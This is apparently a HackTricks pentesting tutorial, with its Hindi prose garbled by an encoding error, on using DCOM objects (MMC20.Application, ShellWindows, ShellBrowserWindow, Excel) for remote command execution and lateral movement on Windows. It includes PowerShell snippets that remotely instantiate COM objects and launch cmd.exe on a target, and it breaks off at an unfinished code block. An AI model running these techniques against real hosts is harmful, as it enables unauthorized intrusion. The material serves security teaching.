# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рдЕрдЯреИрдХ рд╕рд░рдлреЗрд╕ рдХреЛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рд╕рдХреНрд░рд┐рдп рдЦрддрд░рд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреЗ рдкреВрд░реЗ рдЯреЗрдХ рд╕реНрдЯреИрдХ рдореЗрдВ рдореБрджреНрджреЛрдВ рдХреЛ рдвреВрдВрдврддрд╛ рд╣реИ, APIs рд╕реЗ рд▓реЗрдХрд░ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рддрдХред рдЖрдЬ рд╣реА [**рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЖрдЬрдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM** (Distributed Component Object Model) рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ **рд░реЛрдЪрдХ** рд╣реЛрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрдирдХреЗ рд╕рд╛рде рдиреЗрдЯрд╡рд░реНрдХ **рдХреЗ рдЬрд░рд┐рдП рдЗрдВрдЯрд░реИрдХреНрдЯ** рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред Microsoft рдХрд╛ DCOM рдкрд░ рдХреБрдЫ рдЕрдЪреНрдЫрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг [рдпрд╣рд╛рдБ](https://msdn.microsoft.com/en-us/library/cc226801.aspx) рдФрд░ COM рдкрд░ [рдпрд╣рд╛рдБ](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) рд╣реИред рдЖрдк PowerShell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DCOM рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреА рдПрдХ рдордЬрдмреВрдд рд╕реВрдЪреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, `Get-CimInstance Win32_DCOMApplication` рдЪрд▓рд╛рдХрд░ред

[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM рдСрдмреНрдЬреЗрдХреНрдЯ рдЖрдкрдХреЛ MMC рд╕реНрдиреИрдк-рдЗрди рдСрдкрд░реЗрд╢рдиреНрд╕ рдХреЗ рдШрдЯрдХреЛрдВ рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ COM рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рднрд┐рдиреНрди рдореЗрдердбреНрд╕ рдФрд░ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рдПрдиреНрдпреБрдорд░реЗрдЯ рдХрд░рддреЗ рд╕рдордп, рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ Document.ActiveView рдХреЗ рдЕрдВрддрд░реНрдЧрдд `ExecuteShellCommand` рдирд╛рдордХ рдПрдХ рдореЗрдердб рд╣реИред

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

рдЙрд╕ рдореЗрдердб рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝реЗрдВ [рдпрд╣рд╛рдБ](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)ред рдЕрдм рддрдХ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ DCOM рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЬрд░рд┐рдП рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрдорд╛рдВрдбреНрд╕ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдВрддрд┐рдо рдЯреБрдХрдбрд╝рд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕ DCOM рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ ExecuteShellCommand рдореЗрдердб рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдПрдХ рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИред

рд╕реМрднрд╛рдЧреНрдп рд╕реЗ, рдПрдХ рдПрдбрдорд┐рди рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдк PowerShell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DCOM рдХреЗ рд╕рд╛рде рд░рд┐рдореЛрдЯрд▓реА рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, тАЬ`[activator]::CreateInstance([type]::GetTypeFromProgID`тАЭ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЖрдкрдХреЛ рдмрд╕ рдЗрд╕реЗ рдПрдХ DCOM ProgID рдФрд░ рдПрдХ IP рдкрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдлрд┐рд░ рдпрд╣ рдЖрдкрдХреЛ рдЙрд╕ COM рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд░рд┐рдореЛрдЯрд▓реА рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛:

![](<../../.gitbook/assets/image (665).png>)

рдлрд┐рд░ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ `ExecuteShellCommand` рдореЗрдердб рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рдПрдХ рдкреНрд░реЛрд╕реЗрд╕ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

**MMC20.Application** рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ "[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)" рдХреА рдХрдореА рдереА, рдЬрд┐рд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд░рдорд┐рд╢рди рд╕реЗрдЯ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░реНрд╕ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (4) (1) (2).png>)

рдЙрд╕ рдереНрд░реЗрдб рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝реЗрдВ [рдпрд╣рд╛рдБ](https://twitter.com/tiraniddo/status/817532039771525120).\
рджреЗрдЦреЗрдВ рдХрд┐ рдХреМрди рд╕реЗ рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ LaunchPermission рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ, рдЗрд╕реЗ [@tiraniddo](https://twitter.com/tiraniddo) рдХреЗ [OleView .NET](https://github.com/tyranid/oleviewdotnet) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЙрддреНрдХреГрд╖реНрдЯ Python рдлрд┐рд▓реНрдЯрд░реНрд╕ (рдЕрдиреНрдп рдЪреАрдЬреЛрдВ рдХреЗ рдмреАрдЪ) рд╣реИрдВред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдо рдЙрди рд╕рднреА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдлрд┐рд▓реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рд╕реНрдкрд╖реНрдЯ Launch Permission рдирд╣реАрдВ рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рдкрд░, рдореБрдЭреЗ рджреЛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдЦрдбрд╝реЗ рд╣реБрдП: `ShellBrowserWindow` рдФрд░ `ShellWindows`:

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

рд╕рдВрднрд╛рд╡рд┐рдд рд▓рдХреНрд╖реНрдп рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдиреНрдп рддрд░реАрдХрд╛ `HKCR:\AppID\{guid}` рдореЗрдВ рдХреАрдЬрд╝ рд╕реЗ `LaunchPermission` рдорд╛рди рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХреЛ рджреЗрдЦрдирд╛ рд╣реИред Launch Permissions рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдП рдЧрдП рдЕрдиреБрд╕рд╛рд░ рджрд┐рдЦреЗрдЧрд╛, рдмрд╛рдЗрдирд░реА рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП ACL рдХрд╛ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде:

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

рдЬрд┐рдирдореЗрдВ рд╕реНрдкрд╖реНрдЯ LaunchPermission рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ, рдЙрдирдореЗрдВ рд╡рд╣ рд╡рд┐рд╢реЗрд╖ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрдЧреАред

### ShellWindows

рдкрд╣рд▓рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдЬрд┐рд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЛрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ [ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)ред рдЪреВрдВрдХрд┐ рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рд╛рде рдХреЛрдИ [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) рдЬреБрдбрд╝рд╛ рдирд╣реАрдВ рд╣реИ, рд╣рдо [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET рдореЗрдердб рдХреЗ рд╕рд╛рде [Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЗрдВрд╕реНрдЯреЗрдВрдЯрд┐рдПрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ ShellWindows рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП [CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx) рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдЬреЛ OleView .NET рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреВрд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдиреАрдЪреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, "Launch Permission" рдлреАрд▓реНрдб рдЦрд╛рд▓реА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреЛрдИ рд╕реНрдкрд╖реНрдЯ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИрдВред

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

рдЕрдм рдЬрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ CLSID рд╣реИ, рд╣рдо рд░рд┐рдореЛрдЯ рд▓рдХреНрд╖реНрдп рдкрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЗрдВрд╕реНрдЯреЗрдВрдЯрд┐рдПрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote_instantiation_shellwindows.png?w=690&h=354)

рдЬрдм рдСрдмреНрдЬреЗрдХреНрдЯ рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рдЗрдВрд╕реНрдЯреИрдВрдЯрд┐рдПрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдЙрд╕рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬреЛ рднреА рдореЗрдердбреНрд╕ рдЪрд╛рд╣реЗрдВ рдЙрдиреНрд╣реЗрдВ рдЗрдиреНрд╡реЛрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рдЖрдпрд╛ рд╣реИрдВрдбрд▓ рдХрдИ рдореЗрдердбреНрд╕ рдФрд░ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЗ рд╕рд╛рде рднреА рд╣рдо рдЗрдВрдЯрд░реИрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рде рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЗрдВрдЯрд░реИрдХреНрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) рдореЗрдердб рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЬреЛ рд╣рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╡рд╛рдкрд╕ рджреЗрдЧрд╛ рдЬреЛ рд╡рд┐рдВрдбреЛрдЬ рд╢реЗрд▓ рд╡рд┐рдВрдбреЛ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ:
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item_instantiation.png?w=416&h=465)

Shell Window рдкрд░ рдкреВрд░реНрдг рд╣реИрдВрдбрд▓ рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде, рд╣рдо рдЕрдм рд╕рднреА рдЕрдкреЗрдХреНрд╖рд┐рдд рд╡рд┐рдзрд┐рдпреЛрдВ/рдЧреБрдгреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВред рдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рдмрд╛рдж, **`Document.Application.ShellExecute`** рдиреЗ рдзреНрдпрд╛рди рдЦреАрдВрдЪрд╛ред рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ, рдЬреЛ [рдпрд╣рд╛рдБ](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745(v=vs.85).aspx) рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рд╣реИрдВред
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдорд╛рд░рд╛ рдХрдорд╛рдВрдб рдПрдХ рджреВрд░рд╕реНрде рд╣реЛрд╕реНрдЯ рдкрд░ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реБрдЖред

### ShellBrowserWindow

рдпрд╣ рд╡рд┐рд╢реЗрд╖ рдСрдмреНрдЬреЗрдХреНрдЯ Windows 7 рдкрд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд▓реЗрдЯрд░рд▓ рдореВрд╡рдореЗрдВрдЯ рдХреЗ рд▓рд┐рдП "ShellWindows" рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдереЛрдбрд╝рд╛ рд╕реАрдорд┐рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ Win7-Win10 рдкрд░ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ред

рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдореЗрд░реЗ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╣ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рд╡рд┐рдВрдбреЛ рдореЗрдВ рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЗрдВрд╕реНрдЯреЗрдВрдЯрд┐рдПрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдЗрд╕рдХреЗ CLSID рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдКрдкрд░ рдХреА рддрд░рд╣, рд╣рдо OleView .NET рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

рдлрд┐рд░ рд╕реЗ, рдЦрд╛рд▓реА Launch Permission рдлреАрд▓реНрдб рдХрд╛ рдзреНрдпрд╛рди рд░рдЦреЗрдВ:

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

CLSID рдХреЗ рд╕рд╛рде, рд╣рдо рдкрд┐рдЫрд▓реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдХрд┐рдП рдЧрдП рдЪрд░рдгреЛрдВ рдХреЛ рджреЛрд╣рд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЗрдВрд╕реНрдЯреЗрдВрдЯрд┐рдПрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рд╡рд╣реА рдореЗрдердб рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдХрдорд╛рдВрдб рдиреЗ рд░рд┐рдореЛрдЯ рдЯрд╛рд░рдЧреЗрдЯ рдкрд░ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ред

рдЪреВрдВрдХрд┐ рдпрд╣ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реАрдзреЗ Windows рд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд░рддрд╛ рд╣реИ, рд╣рдореЗрдВ "ShellWindows.Item" рдореЗрдердб рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдерд╛ред

рдЬрдмрдХрд┐ рдпреЗ рджреЛ DCOM рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рд╢реЗрд▓ рдХрдорд╛рдВрдбреНрд╕ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рдореЗрдердбреНрд╕ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рд░рд┐рдореЛрдЯ рдЯрд╛рд░рдЧреЗрдЯ рдХреЛ рдПрдиреНрдпреБрдорд░реЗрдЯ рдпрд╛ рдЯреИрдореНрдкрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрди рдореЗрдердбреНрд╕ рдореЗрдВ рд╕реЗ рдХреБрдЫ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

рдЗрд╕реА рддрд░рд╣ рд╕реЗ DCOM Excel рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЗрдЯрд░рд▓ рдореВрд╡рдореЗрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдкрдврд╝реЗрдВ [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
